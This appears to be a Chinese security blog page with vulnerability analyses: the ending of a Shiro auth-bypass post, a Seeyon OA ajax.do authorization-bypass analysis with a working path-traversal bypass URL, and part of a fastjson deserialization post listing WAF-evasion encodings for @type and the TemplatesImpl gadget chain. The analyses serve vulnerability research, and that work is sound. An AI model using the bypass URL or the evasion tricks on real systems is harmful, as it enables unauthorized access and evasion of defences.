<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831143643479.png" alt="image-20210831143643479"></p>
<h4 id="如何修复这个漏洞？-2"><a href="#如何修复这个漏洞？-2" class="headerlink" title="如何修复这个漏洞？"></a>如何修复这个漏洞？</h4><p>​        升级shiro到<code>1.6.0</code>版本，在这个版本，新增了默认的Filter,这个Filter的拦截范围为<code>/**</code>,在<code>org.apache.shiro.spring.web.ShiroFilterFactoryBean#createFilterChainManager</code>中可以看到对应的代码。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831151524382.png" alt="image-20210831151524382"></p>
<p>​        继续跟进，发现将<code>/**</code>交给InvalidRequestFilter进行处理。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831153213504.png" alt="image-20210831153213504"></p>
<p>​        新增了默认Filter后，无论我们怎么绕过一定会被<code>/**</code>匹配到。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831152150751.png" alt="image-20210831152150751"></p>
<p>​        在InvalidRequestFilter的doFilter方法执行前，先调用<code>onPreHandle</code>做一些前置处理，通过<code>isAccessAllowed</code>方法对请求验证。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831153632212.png" alt="image-20210831153632212"></p>
<p>​        在<code>isAccessAllowed</code>中验证请求内容是否包含黑名单中的内容。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831153954322.png" alt="image-20210831153954322"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        Shiro的权限认证漏洞归根结底还是和Spring会处理<code>/;xxx</code>的内容有关，通过shiro过滤器和Spring获取请求URL的不一致性产生了绕过。从漏洞利用的角度来讲，只有<code>CVE-2020-1957</code>影响最广，利用条件是不能配置<code>map.put(&quot;/**&quot;, &quot;authc&quot;);</code>,也就是说即使版本存在漏洞，也可以通过配置<code>map.put(&quot;/**&quot;, &quot;authc&quot;);</code>来防御权限绕过漏洞。至于其余两个绕过则显得比较鸡肋，即使绕过了Shiro的权限认证，也无法有效的控制输入。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">致远Ajax.do权限绕过分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-08-26 11:02:35" itemprop="dateCreated datePublished" datetime="2021-08-26T11:02:35+08:00">2021-08-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-08-30 16:01:44" itemprop="dateModified" datetime="2021-08-30T16:01:44+08:00">2021-08-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞利用</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​            之前致远爆了关于ajax.do的权限绕过漏洞，虽然看网上和官方都说是由于shiro的权限认证绕过导致的，但是我并没有在代码中找到致远使用shiro进行权限认证的相关代码，所以想深入分析下致远会产生权限绕过漏洞。还是以解决问题的方式来分析这个漏洞吧。</p>
<h3 id="致远请求ajax-do的流程是怎样的？"><a href="#致远请求ajax-do的流程是怎样的？" class="headerlink" title="致远请求ajax.do的流程是怎样的？"></a>致远请求ajax.do的流程是怎样的？</h3><p>​        根据web.xml中的配置，当我们请求*.do会进入到SecurityFilter过滤器，这也是致远的核心过滤器。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826161906943.png" alt="image-20210826161906943"></p>
<p>​        这个过滤器中会对多种url请求做处理，我们访问ajax.do会经过SpringControllerAuthenticator的认证。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826162054046.png" alt="image-20210826162054046"></p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826161957693.png" alt="image-20210826161957693"></p>
<p>​        在<code>com.seeyon.ctp.common.web.filter.SpringControllerAuthenticator#authenticate</code>中，当通过session中没有获取到用户信息，会进行一个关键的处理，这个处理是由isNeedlessCheckLogin做的，主要是判断用户访问的url是否在白名单中，如果在则通过认证。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826162226231.png" alt="image-20210826162226231"></p>
<p>​            在<code>isNeedlessCheckLogin</code>中首先判断是否访问ajax.do，如果是则通过managerName参数来判断是否在白名单，在needless_check_login.xml中配置了白名单，如果请求url在白名单中，则再去判断method是否在白名单中，如果配置中的methods包含*则任意method均可访问。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826163853640.png" alt="image-20210826163853640"></p>
<p>​        假如通过了白名单认证，后面还会判断是否为ajax.do请求，如果是还要再经过一次认证。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826164432451.png" alt="image-20210826164432451"></p>
<p>​        这层检测会检测managerName参数是否在白名单中，当不在白名单中，会再调用<code>validateResource</code>进行检测。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826165918965.png" alt="image-20210826165918965"></p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826165936851.png" alt="image-20210826165936851"></p>
<p>​        这里也有一个白名单，显然之前用的payload是没有在这个白名单中的，这里也可以通过调试看到这里抛出了异常。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826170339106.png" alt="image-20210826170339106"></p>
<p>​        主要的问题是<code>com.seeyon.ctp.common.web.filter.CTPSecurityFilter#doFilter</code>中catch了这个异常并且程序继续以accept为ture执行后面的过滤器。所以这套程序对于ajax.do中白名单是无效的，我觉得这也是致远权限绕过的关键。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826170707974.png" alt="image-20210826170707974"></p>
<h3 id="致远绕过权限认证后为什么还能匹配到-ajax-do"><a href="#致远绕过权限认证后为什么还能匹配到-ajax-do" class="headerlink" title="致远绕过权限认证后为什么还能匹配到/ajax.do?"></a>致远绕过权限认证后为什么还能匹配到/ajax.do?</h3><p>​      我们看下请求绕过的payload,通过之前的分析，由于autoinstall.do在白名单中，并且它的method为*,所以可以绕过filter的认证。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;seeyon&#x2F;autoinstall.do&#x2F;..&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826171641798.png" alt="image-20210826171641798"></p>
<p>​        虽然这里绕过了filter的认证，但是是在哪一步对<code>/seeyon/autoinstall.do/../ajax.do</code>处理为/ajax.do的呢？根据之前shiro权限认证绕过的经验，大概可以确定在spring中会<strong>decodeAndCleanUriString</strong>会对url进行处理。但是这里也仅仅移除了;到/之间的内容，并没有对uri进行处理。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826171819358.png" alt="image-20210826171819358"></p>
<p>​        在继续追代码发现<code>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping</code>中经过<code>org.springframework.web.util.UrlPathHelper#getServletPath</code>处理后url发生了变化。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826172028980.png" alt="image-20210826172028980"></p>
<p>​        而<code>request.getServletPath();</code>是tomcat中的方法，经过这个方法处理后会得到去除../后的url。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826172306044.png" alt="image-20210826172306044"></p>
<p>​        这里可以用./来进行验证。</p>
<p><img src="/2021/08/26/%E8%87%B4%E8%BF%9CAjax-do%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/image-20210826172520269.png" alt="image-20210826172520269"></p>
<p>​        所以可以得出结论，这个问题是spring和tomcat组合产生的，它可以接收/xxxx/../xxx.do之类的请求并在最终请求是转换为xxx.do。</p>
<h3 id="这种绕过适用于什么场景？"><a href="#这种绕过适用于什么场景？" class="headerlink" title="这种绕过适用于什么场景？"></a>这种绕过适用于什么场景？</h3><p>​        通过上面的分析我们已经了解了这个漏洞形成的原理，当然想利用该漏洞中的技巧挖掘其他产品的漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 使用了spring技术</span><br><span class="line">2. 根据url地址的不同配置了白名单机制。</span><br><span class="line">3. 在白名单认证之前没有对..和;做c</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">fastjson反序列化漏洞分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-08-06 13:47:24" itemprop="dateCreated datePublished" datetime="2021-08-06T13:47:24+08:00">2021-08-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-08-13 13:57:23" itemprop="dateModified" datetime="2021-08-13T13:57:23+08:00">2021-08-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index">
                    <span itemprop="name">反序列化</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        最近做项目遇到存在漏洞的fastjson,虽然最终还是打下来了，但是要深入利用如果不了解原理就比较难受，因此专门花时间了解下fastjson反序列化漏洞形成的原理。我不想长篇大论的去写很多关于fastjson的问题，主要是解决我这个没接触过fastjson漏洞的一些疑惑。</p>
<h3 id="有没有特殊编码可以绕WAF？"><a href="#有没有特殊编码可以绕WAF？" class="headerlink" title="有没有特殊编码可以绕WAF？"></a><strong>有没有特殊编码可以绕WAF？</strong></h3><p>​        之前做渗透，当json数据包中出现<code>&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</code>数据包就会被拦截，因此分析下有没有替代方案可以绕过WAF。</p>
<p>​        在<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>中会对JSON进行词法解析。当解析到第一个内容是,时，会忽略后面的,和其他空白字符。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210809195430699.png" alt="image-20210809195430699"></p>
<p>​        所以使用下面的内容仍然可以解析。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210809200029784.png" alt="image-20210809200029784"></p>
<p>​        当解析的内容为”,会通过scanSymbol解析key的内容，当当前的内容为\会进入if的逻辑。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210809200956010.png" alt="image-20210809200956010"></p>
<p>​        下面会解析\后的字符，根据\后的字符执行不同的操作。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210809201034510.png" alt="image-20210809201034510"></p>
<p>​        当解析到\x或\u会取后面的内容会接收内容并转换成char。所以可以通过16进制或unicode编码绕过拦截。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@\u0074ype     -&gt;     @type</span><br><span class="line">@\x74ype       -&gt;     @type</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210809201156390.png" alt="image-20210809201156390"></p>
<p>​        获取key后，继续调用skipWhitespace对后面的内容进行处理，会将:前的空字符替换为空。所以下面的内容也不会影响解析<code>{\&quot;@type\&quot;\t\n\r:\&quot;com.spring.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Mi1k7ea\&quot;}</code></p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210809201927817.png" alt="image-20210809201927817"></p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210809202116641.png" alt="image-20210809202116641"></p>
<p>​        在往下走，将:后和空白字符也替换为空。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210809203925768.png" alt="image-20210809203925768"></p>
<p>​        当key的内容为@type，会进入if语句中，并且再次通过scanSymbol获取value的内容，所以value也可以使用十六进制或者unicode编码绕过。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210809204100959.png" alt="image-20210809204100959"></p>
<p>​        下面通过<code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</code>加载value对应的类的信息。注意下面，当以L开头并和；结尾，会去掉这两个字符并重复调用<code>TypeUtils#loadClass</code>,所以<code>Lcom.spring.Student;</code>或者<code>LLcom.spring.Student;;</code>都会解析出<code>com.spring.Student</code>,所以也可以通过这种方式绕过。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210809204814799.png" alt="image-20210809204814799"></p>
<p>​        所以总结一下，绕过方法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 在@type的双引号前加,和其他空白字符，比如 \b \n \t等等</span><br><span class="line">2. 在&quot;和：的中间加空白字符</span><br><span class="line">3. 对内容进行16进制或unicode编码，当然可以一起混合使用</span><br><span class="line">4. 在class的内容前加L之后加;</span><br></pre></td></tr></table></figure>

<h3 id="反序列化过程中会调用什么方法？有何限制？"><a href="#反序列化过程中会调用什么方法？有何限制？" class="headerlink" title="反序列化过程中会调用什么方法？有何限制？"></a><strong>反序列化过程中会调用什么方法？有何限制？</strong></h3><p>​        通过ClassLoader加载到@type指定的类后，接下来会根据类名获取对应的反序列化器，当没有匹配到合适的反序列化器时，会通过<code>createJavaBeanDeserializer</code>创建JavaBeanDeserializer反序列化器。createJavaBeanDeserializer反序列化器中，调用<code>JavaBeanInfo.build</code>方法中动态创建一个JavaBeanInfo对象，最后根据得到的JavaBeanInfo对象,通过<code>asmFactory.createJavaBeanDeserializer</code>动态构建一个JavaBeanDeserializer类。</p>
<p>​        首先通过<code>getDefaultConstructor</code>获取构造器</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210810115316825.png" alt="image-20210810115316825"></p>
<p>​        在<code>getDefaultConstructor</code>默认会获取无参构造器，如果不存在无参构造器，如果不存在无参构造器，则获取参数为当前Class类型的1个参数构造器。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210810115008162.png" alt="image-20210810115008162"></p>
<p>​        如果没有无参构造方法或者参数为当前class类型的有参构造方法，则通过注解获取构造方法，对于挖洞或者利用漏洞来讲，我们一般找的会是一个通用的类，一般不会有fastjson的注解信息，所以这段不分析了。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210810115703210.png" alt="image-20210810115703210"></p>
<p>​        总结一下构造方法的调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 默认情况下调用无参构造方法，</span><br><span class="line">2. 如果没有无参构造方法，调用参数为当前class类型的1个参数的构造方法</span><br></pre></td></tr></table></figure>

<p>​        下面再看看对setter method的处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. methodName名称大于4</span><br><span class="line">2. method不能为static</span><br><span class="line">3. method的返回值为void或当前class的类型0</span><br><span class="line">4. parm长度为1</span><br><span class="line">5. methodName以set开头</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210810120808140.png" alt="image-20210810120808140"></p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210810121307901.png" alt="image-20210810121307901"></p>
<p>​        接下来找到set方法设置的字段名，并将这些信息添加到fieldList中。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210810140411609.png" alt="image-20210810140411609"></p>
<p>​        下面也会对getter方法做判断，但是对getter方法的返回值有一些要求，不太容易满足。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210813095915259.png" alt="image-20210813095915259"></p>
<p>​        接下来将得到的class，构造方法，filed等信息封装到JavaBeanInfo对象中并返回。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210810174755608.png" alt="image-20210810174755608"></p>
<p>​        得到JavaBeanInfo后，通过asm动态创建JavaBeanDeserializer的实现类。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210810181457685.png" alt="image-20210810181457685"></p>
<p>​        我们不去分析具体的生成过程，把动态生成的class文件看看即可。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811100951035.png" alt="image-20210811100951035">        这个文件比较长，在<code>deserialze</code>中，会调用构造方法，还有对应的setter方法。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811101036551.png" alt="image-20210811101036551"></p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811101049087-16286478493461.png" alt="image-20210811101049087"></p>
<p>​        通过parse反序列化得到对应的对象后，会判断反序列化得到的对象类型是否为JSONObject类型，如果不是则调用toJSON进行类型转换。    </p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811150655676.png" alt="image-20210811150655676"></p>
<p>​        在toJSON中，根据obj的类型得到clazz，根据clazz通过<code>config.getObjectWriter(clazz);</code>获取由ASM动态构建的继承了JavaBeanSerializer的序列化器，这个过程和pase的过程有些类似，不同的是，得到序列化器时构造beaninfo信息时通过<code>com.alibaba.fastjson.util.TypeUtils#computeGetters</code>方法，computeGetters中会对getter方法进行限制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 非静态方法</span><br><span class="line">2. 返回值非空</span><br><span class="line">3. 参数不能为空</span><br><span class="line">4. 返回类型不能为ClassLoader</span><br><span class="line">5. 不能调用getMetaClass方法</span><br><span class="line">6. 不能调用getClass方法或getDeclaringClass方法</span><br><span class="line">7. get开头并且不能小于4个字符</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811164406216.png" alt="image-20210811164406216"></p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811164803524.png" alt="image-20210811164803524"></p>
<p>​            将filed method等属性封装到FiledInfo中。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811165020874.png" alt="image-20210811165020874"></p>
<p>​        得到动态构建的序列化器后，调用getFileValuesMap获取字段的值，由于ASM动态构造的反序列化器没有这个方法，因此会调用父类JavaBeanSerializer的getFieldValuesMap方法。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811153553795.png" alt="image-20210811153553795"></p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811154100302.png" alt="image-20210811154100302"></p>
<p>​        getFieldValuesMap中，根据sortedGetters中保存的FieldSerializer，调用getPropertyValue方法，实际最终是通过反射调用了对应的getter方法。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811154316625.png" alt="image-20210811154316625"></p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811154544475.png" alt="image-20210811154544475"></p>
<h3 id="反序列化利用链原理是什么？"><a href="#反序列化利用链原理是什么？" class="headerlink" title="反序列化利用链原理是什么？"></a>反序列化利用链原理是什么？</h3><p>​        通过上面的分析，当执行parseObject时，会执行构造方法和setter和getter方法，所以我们要通过控制getter和setter方法来对属性赋值从而执行恶意操作。</p>
<h4 id="TemplateImpl"><a href="#TemplateImpl" class="headerlink" title="TemplateImpl"></a>TemplateImpl</h4><p>​        这个利用方式之前分析Hibernate利用链时分析过，其实fastjson的利用限制和hibernate的差不多。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210811182520612.png" alt="image-20210811182520612"></p>
<p>​        通过之前我们对TemplatesImpl利用链的理解，我们需要对下面的属性赋值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. _bytecodes</span><br><span class="line">2. _name</span><br></pre></td></tr></table></figure>

<p>​        并且其存在无参的public构造方法或者参数为当前类型的构造方法。而TemplateImpl类刚好有无参的public构造方法。</p>
<p><img src="/2021/08/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210812092914276.png" alt="image-20210812092914276"></p>
<p>​        另外，触发TemplatesImpl的方法是getOutputProperties方法，也就是一个gettter方法，只有在parseObject方法中，才会在执行完parse后调用toJSON，在toJSON中调用getter方法，所以这也限定了<strong>只有在通过parseObject解析时才可以使用TemplatesImpl利用链</strong>。</p>
<p><strong>如何给_bytecodes传入字节数组？</strong></p>
